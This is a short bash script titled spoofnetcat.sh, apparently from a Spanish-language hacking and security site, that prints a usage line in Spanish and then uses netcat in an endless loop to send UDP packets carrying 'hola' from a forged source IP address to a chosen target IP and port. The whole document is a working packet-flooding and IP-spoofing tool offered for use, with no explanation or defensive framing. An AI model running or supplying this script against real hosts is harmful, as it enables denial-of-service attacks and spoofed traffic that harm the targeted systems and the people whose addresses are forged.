#!/bin/bash
# (c) hacking y seguridad .com 2022
echo 
echo "Uso.: ./spoofnetcat.sh ip_spoof ip_destino puerto_udp"
echo
while : ; do
echo -n "hola" | nc -u -s $1 $2 $3
done
